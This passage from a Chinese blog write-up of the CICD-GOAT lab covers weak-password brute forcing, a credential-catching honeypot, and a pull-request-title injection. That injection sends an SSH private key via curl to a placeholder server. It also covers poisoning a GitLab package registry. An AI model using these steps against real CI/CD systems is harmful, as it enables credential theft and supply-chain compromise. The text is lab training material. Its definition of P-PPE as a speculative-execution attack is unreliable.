+<h3 id="五、弱口令和节点漏洞"><a href="#五、弱口令和节点漏洞" class="headerlink" title="五、弱口令和节点漏洞"></a><strong>五、弱口令和节点漏洞</strong></h3><h4 id="1、漏洞发现入口-3"><a href="#1、漏洞发现入口-3" class="headerlink" title="1、漏洞发现入口"></a><strong>1、漏洞发现入口</strong></h4><p>在遇到题目heart的时候，发现people下面有很多的用户，其中Knave是agent的admin。根据提示需要暴力破解，以及搭建蜜罐获取对应flag。</p>
+<h4 id="2、漏洞利用过程-3"><a href="#2、漏洞利用过程-3" class="headerlink" title="2、漏洞利用过程"></a><strong>2、漏洞利用过程</strong></h4><h5 id="Hearts"><a href="#Hearts" class="headerlink" title="Hearts"></a><strong>Hearts</strong></h5><p>首先对Knave账户密码进行弱口令爆破，拿到密码。<br><code>    knave:rockme</code><br>之后创建新的node，设置其host和Credentials为自己的服务器和agent的credentials，ssh发送到自己的蜜罐上获得flag。</p>
+<p>创建蜜罐使用下面的指令：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 2222:2222 cowrie/cowrie</span><br><span class="line"><span class="comment">#设置端口转发</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip\_forward</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 2222 -j ACCEPT</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222</span><br><span class="line"></span><br><span class="line"><span class="comment">#蜜罐使用完之后将转发的规则删除，要删干净。</span></span><br><span class="line">iptables -L INPUT --line-numbers</span><br><span class="line">iptables -D INPUT 7</span><br><span class="line">iptables -t nat -L -n --line-numbers</span><br><span class="line">iptables -t nat -D PREROUTING 2</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/img/motion.gif" data-original="/images/cloud/26.png"><br>然后创建新节点。<br><img src="/img/motion.gif" data-original="/images/cloud/27.png"><br>save后机器启动，蜜罐收到flag。</p>
+<h4 id="3、漏洞利用结果-3"><a href="#3、漏洞利用结果-3" class="headerlink" title="3、漏洞利用结果"></a><strong>3、漏洞利用结果</strong></h4><h5 id="Hearts-1"><a href="#Hearts-1" class="headerlink" title="Hearts"></a><strong>Hearts</strong></h5><p><code>    flag：agent:B1A648E1-FD8B-4D66-8CAF-78114F55D396</code></p>
+<h3 id="六、代码注入漏洞"><a href="#六、代码注入漏洞" class="headerlink" title="六、代码注入漏洞"></a><strong>六、代码注入漏洞</strong></h3><h4 id="1、漏洞发现入口-4"><a href="#1、漏洞发现入口-4" class="headerlink" title="1、漏洞发现入口"></a><strong>1、漏洞发现入口</strong></h4><p>对于题目Dormouse中的环境，gitea中dormouse不可控，其Jenkinsfile请求一远程sh文件后执行。<br><img src="/img/motion.gif" data-original="/images/cloud/28.png"><br>0177.0.0.01是八进制的127.0.0.1。clone下来该仓库文件。<br><img src="/img/motion.gif" data-original="/images/cloud/29.png"><br>查看其Jenkinsfile：<br><img src="/img/motion.gif" data-original="/images/cloud/30.png"><br>发现存在代码注入漏洞，其中会取pr的title拼到命令执行，也可以执行P-PPE攻击。</p>
+<p>备注：<strong>P-PPE（Phantom-Property Pre-Execution）攻击</strong> 是一种针对现代处理器的推测执行（Speculative Execution）漏洞的攻击类型，主要通过利用处理器在执行程序时的推测机制，泄露系统中的敏感信息。它属于侧信道攻击（Side-Channel Attack）的范畴，与著名的 <strong>Spectre</strong> 和 <strong>Meltdown</strong> 漏洞有相似之处。</p>
+<h4 id="2、漏洞利用过程-4"><a href="#2、漏洞利用过程-4" class="headerlink" title="2、漏洞利用过程"></a><strong>2、漏洞利用过程</strong></h4><h5 id="Dormouse"><a href="#Dormouse" class="headerlink" title="Dormouse"></a><strong>Dormouse</strong></h5><p>根据下面的代码：<br><img src="/img/motion.gif" data-original="/images/cloud/31.png"><br>执行的node上存在$KEY，是ssh的私钥，可以利用代码注入获取这个私钥，并通过scp传送reportcov.sh文件来把恶意的reportcov.sh文件传送过去，这样dormouse仓库build的时候就会执行我们的恶意代码。先把rep项目fork下来。随便修改以尝试注入。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  `<span class="built_in">echo</span> <span class="string">"<span class="variable">${KEY}</span>"</span> &gt; key &amp;&amp; curl -v -F file=@key http://http\_server\_ip:port`</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="3、漏洞利用结果-4"><a href="#3、漏洞利用结果-4" class="headerlink" title="3、漏洞利用结果"></a><strong>3、漏洞利用结果</strong></h4><h5 id="Dormouse-1"><a href="#Dormouse-1" class="headerlink" title="Dormouse"></a><strong>Dormouse</strong></h5><p>有服务器的话能收到key：<br><img src="/img/motion.gif" data-original="/images/cloud/32.png"><br>于是直接ssh登陆。<br><img src="/img/motion.gif" data-original="/images/cloud/33.png"><br>重新build拿到flag。</p>
+<h3 id="七、pipeline构建恶意代码执行漏洞"><a href="#七、pipeline构建恶意代码执行漏洞" class="headerlink" title="七、pipeline构建恶意代码执行漏洞"></a><strong>七、pipeline构建恶意代码执行漏洞</strong></h3><h4 id="1、漏洞发现入口-5"><a href="#1、漏洞发现入口-5" class="headerlink" title="1、漏洞发现入口"></a><strong>1、漏洞发现入口</strong></h4><p>对于题目Gryphon，一共三个仓库，pygrphon，awesome-app的pipeline构建的时候调用恶意代码，flag11是nest-of-gold的环境变量。</p>
+<p>查看nest-of-gold的pipeline中最后会build当前dockerfile并构建容器，flag11是容器环境变量，nest-of-gold的dockerfile中拉去的镜像是gitlab仓库当中的。可以利用通过awesome-app中pipeline执行我们注入的恶意代码，将恶意镜像推送到gitlab，污染image，拿到flag。</p>
+<h4 id="2、漏洞利用过程-5"><a href="#2、漏洞利用过程-5" class="headerlink" title="2、漏洞利用过程"></a><strong>2、漏洞利用过程</strong></h4><h5 id="Gryphon"><a href="#Gryphon" class="headerlink" title="Gryphon"></a><strong>Gryphon</strong></h5><p>登陆gitlab，搜索flag11发现被引用。<br><img src="/img/motion.gif" data-original="/images/cloud/34.png"><br>修改greet.py:<br><img src="/img/motion.gif" data-original="/images/cloud/35.png"><br>执行后会获取flag命令来替代镜像中python3命令。官方在执行install requirements.txt的时候就会curl，这个时候flag还没有注入环境。之后build包先删除现有的。<br><img src="/img/motion.gif" data-original="/images/cloud/36.png"></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3.10 -m build ./</span><br><span class="line">python3.10 -m twine upload -r gitlab dist/\* --verbose</span><br></pre></td></tr></tbody></table></figure>
+<p>执行前需要准备.pypirc文件。<br><img src="/img/motion.gif" data-original="/images/cloud/37.png"><br>password就填从gitlab创建的access token。<br><img src="/img/motion.gif" data-original="/images/cloud/38.png"><br>之后等项目每10分钟自动执行pipeline即可拿到flag。</p>
+<p>awesome-app的pipeline会安装一些东西需要十几分钟的时间，nest-of-gold的pipeline会直接报错，这似乎是代码本身的问题，gitlab登root上去把这行pipeline删掉就行。</p>
+<p>之后触发恶意代码，执行test_hello.py然后访问flash中的hello函数，触发恶意方法。</p>
+<h4 id="3、漏洞利用结果-5"><a href="#3、漏洞利用结果-5" class="headerlink" title="3、漏洞利用结果"></a><strong>3、漏洞利用结果</strong></h4><h5 id="Gryphon-1"><a href="#Gryphon-1" class="headerlink" title="Gryphon"></a><strong>Gryphon</strong></h5><p><img src="/img/motion.gif" data-original="/images/cloud/39.png"><br>至此，靶场热门的11个flag全部拿到。</p>
+<hr>
+<h2 id="第二项：个人成长部分"><a href="#第二项：个人成长部分" class="headerlink" title="第二项：个人成长部分"></a><strong>第二项：个人成长部分</strong></h2><p>通过这两个月的课堂学习和 CICD-GOAT 靶场的实操练习，我对云安全的理解有了较大提升。目前，我已经掌握了云安全的基本概念，例如共享责任模型（Shared Responsibility Model）、零信任架构（Zero Trust Architecture）等，了解了云安全中关键的技术领域，包括身份与访问管理（IAM）、数据加密与密钥管理（KMS）、网络安全组（Security Group）、入侵检测与防御系统（IDS/IPS）以及docker使用等内容。此外，通过靶场的实践，我熟悉了常见的云安全攻击手法，如云环境中的未授权访问、权限提升、存储桶暴露、供应链攻击，PPE漏洞等等内容以及其相应的攻击手段和工具使用方式。</p>
+<p>对于本次靶场实验，踩了很多坑：最开始会很卡，无法访问一些站点，需要换虚拟机型号。在拉取镜像的时候出现了经常一半卡住的问题，需要信号中断后重新反复拉取，更改了比较高质量的源也没有解决该问题。对于中间的build经常卡住需要重启jenkins-server，然后在搭建蜜罐的时候突然出现端口占用以及站点断连，通过重启虚拟机解决，还关闭了指定端口的容器。然后对于需要用到http服务器的几个flag题目，不得不想办法创建http服务，缺少外界相关支持，得自学着搭。还有就是站点交互界面缺少引导，自己摸索了一下如何pr，还有生成ac token。中间关闭靶场和启动有时候无法解决断连问题不得不重启。</p>
+<p>然而，我也意识到自己的不足之处：在应对复杂云环境中多租户隔离问题、动态威胁检测、微服务架构下的安全设计，以及 DevSecOps 中如何高效集成安全工具链等方面，还没有理解和相关实践经验。对于 Kubernetes 集群的操作、API 网关的安全控制，以及基于事件响应的自动化安全处理流程仍有大量提升空间。</p>
+<p>我的总结是：云安全不仅是技术的积累，更是对整体架构的全局性思考。现代云原生环境的复杂性和动态性要求我们具备扎实的理论基础，同时也要在实际攻防场景中不断提升自己的综合能力。随着越来越多的企业生产环境中都应用了CI/CD来部署。这也导致很多的攻击面暴露出来，因此需要更加注重管道的安全性。从本地开发环境到云端 CICD 流水线的每个环节，从基础设施即代码（IaC）的安全扫描到运行时的威胁检测，我们需要深刻理解各层面的安全风险及其应对措施。未来，我计划进一步加强领域的学习，并结合实际案例，提升安全策略的设计和实施能力。只有通过理论与实践的结合，持续关注云安全的最新技术趋势，才能真正掌握这个领域的核心能力。</p>
+<p>署名：火之意志继承者</p>
+<p>提交日期：2024年12月11日</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://tardfyou.github.io">Tardfyou</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tardfyou.github.io/2024/12/11/%E4%BA%91%E5%AE%89%E5%85%A8%EF%BC%9ACICD%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D/">https://tardfyou.github.io/2024/12/11/云安全：CICD靶场实操/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/learning/">learning</a></div><div class="post_share"><div class="social-share" data-image="https://external-preview.redd.it/e1vPmXFtQrlXfTyvRJ-J7CqaRWOVljVLAJtPcRxeR2c.jpg?auto=webp&amp;s=2a7bd02c4ee80268eb5a7f6e52b4080b5504a458" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/09/13/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" title="靶场渗透"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">靶场渗透</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/03/01/%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%A7%BB%E6%A4%8D/" title="一次博客移植"><img class="cover" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/umishibaura_09.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-01</div><div class="title">一次博客移植</div></div></a></div><div><a href="/2023/10/23/%E7%AC%AC%E4%B8%80%E6%AC%A1Linux-Kernel%E7%9A%84patch%E6%8F%90%E4%BA%A4/" title="第一次Linux Kernel的patch提交"><img class="cover" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/arimagawa_15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-23</div><div class="title">第一次Linux Kernel的patch提交</div></div></a></div><div><a href="/2024/05/22/520%E6%99%9A%E4%B8%8A%E7%9A%84%E6%94%BB%E9%98%B2%E6%B5%AA%E6%BC%AB/" title="520和安全一同度过"><img class="cover" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/seihama_02.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-22</div><div class="title">520和安全一同度过</div></div></a></div><div><a href="/2024/06/01/AntiSword-Attack/" title="AntiSword Attack"><img class="cover" src="/img/motion.gif" data-original="/images/AntiSword/umishibaura_16.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-01</div><div class="title">AntiSword Attack</div></div></a></div><div><a href="/2024/06/09/%E9%BB%91%E5%AE%A2%E9%81%93%E7%B2%BE%E7%A5%9E%E8%BF%98%E6%98%AF%E5%BC%80%E6%BA%90%E7%B2%BE%E7%A5%9E%EF%BC%9F/" title="黑客道精神还是开源精神？"><img class="cover" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/aomi_01.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-09</div><div class="title">黑客道精神还是开源精神？</div></div></a></div><div><a href="/2024/07/23/%E8%BF%90%E7%BB%B4%E6%A8%A1%E5%9E%8B%E8%AF%AD%E6%96%99%E5%BA%93%E6%A1%86%E6%9E%B6/" title="运维模型语料库框架"><img class="cover" src="/img/motion.gif" data-original="https://seaside-station.com/wpbin/wp-content/uploads/nebukawa_45.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-23</div><div class="title">运维模型语料库框架</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/motion.gif" data-original="/img/train1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tardfyou</div><div class="author-info__description">S0me71me5 i DoN"T。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tardfyou"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Tardfyou" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/Yo_vincent?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="https://qm.qq.com/q/Lu0yjtReYS&amp;personal_qrcode_source=3" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:3143596095@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">一个满怀热爱的CSEer的成长之路 ✩◝(◍⌣̎◍)◜ ✩我梦寐以求，是真爱和自由</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%A1%B9%EF%BC%9A%E5%AE%9E%E6%93%8D%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">第一项：实操部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> 准备、环境搭建和配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81PPE%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">一、PPE类型漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81PPE%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%85%A5%E5%8F%A3"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、PPE类型漏洞发现入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81PPE%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、PPE类型漏洞利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#White-Rabbit"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">White Rabbit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mad-Hatter"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">Mad Hatter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Caterpillar"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">Caterpillar</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cheshire-Cat"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">Cheshire Cat</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mock-Turtle"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">Mock Turtle</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81PPE%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%9C"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、PPE类型漏洞利用结果</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#White-rabbit"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">White rabbit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mad-Hatter-1"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">Mad Hatter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Caterpillar-1"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">Caterpillar</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cheshire-Cat-1"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">Cheshire Cat</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mock-Turtle-1"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">Mock Turtle</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BB%A3%E7%A0%81%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">二、代码库敏感信息泄露漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%85%A5%E5%8F%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">1、漏洞发现入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">2、漏洞利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Duchess"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Duchess</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%9C"><span class="toc-number">1.3.3.</span> <span class="toc-text">3、漏洞利用结果</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Duchess-1"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">Duchess</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BE%9D%E8%B5%96%E9%A1%B9%E6%8A%95%E6%AF%92%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">三、依赖项投毒漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%85%A5%E5%8F%A3-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">1、漏洞发现入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">2、漏洞利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Twiddledum"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">Twiddledum</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%9C-1"><span class="toc-number">1.4.3.</span> <span class="toc-text">3、漏洞利用结果</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Twiddledum-1"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">Twiddledum</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">四、扫描器劫持漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%85%A5%E5%8F%A3-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">1、漏洞发现入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-2"><span class="toc-number">1.5.2.</span> <span class="toc-text">2、漏洞利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Dodo"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">Dodo</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%9C-2"><span class="toc-number">1.5.3.</span> <span class="toc-text">3、漏洞利用结果</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Dodo-1"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">Dodo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%92%8C%E8%8A%82%E7%82%B9%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">五、弱口令和节点漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%85%A5%E5%8F%A3-3"><span class="toc-number">1.6.1.</span> <span class="toc-text">1、漏洞发现入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-3"><span class="toc-number">1.6.2.</span> <span class="toc-text">2、漏洞利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Hearts"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">Hearts</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%9C-3"><span class="toc-number">1.6.3.</span> <span class="toc-text">3、漏洞利用结果</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Hearts-1"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">Hearts</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.</span> <span class="toc-text">六、代码注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%85%A5%E5%8F%A3-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">1、漏洞发现入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-4"><span class="toc-number">1.7.2.</span> <span class="toc-text">2、漏洞利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Dormouse"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">Dormouse</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%9C-4"><span class="toc-number">1.7.3.</span> <span class="toc-text">3、漏洞利用结果</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Dormouse-1"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">Dormouse</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E3%80%81pipeline%E6%9E%84%E5%BB%BA%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.</span> <span class="toc-text">七、pipeline构建恶意代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%85%A5%E5%8F%A3-5"><span class="toc-number">1.8.1.</span> <span class="toc-text">1、漏洞发现入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-5"><span class="toc-number">1.8.2.</span> <span class="toc-text">2、漏洞利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Gryphon"><span class="toc-number">1.8.2.1.</span> <span class="toc-text">Gryphon</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%93%E6%9E%9C-5"><span class="toc-number">1.8.3.</span> <span class="toc-text">3、漏洞利用结果</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Gryphon-1"><span class="toc-number">1.8.3.1.</span> <span class="toc-text">Gryphon</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%A1%B9%EF%BC%9A%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF%E9%83%A8%E5%88%86"><span class="toc-number">2.</span> <span class="toc-text">第二项：个人成长部分</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/11/%E4%BA%91%E5%AE%89%E5%85%A8%EF%BC%9ACICD%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D/" title="云安全：CICD靶场实操"><img src="/img/motion.gif" 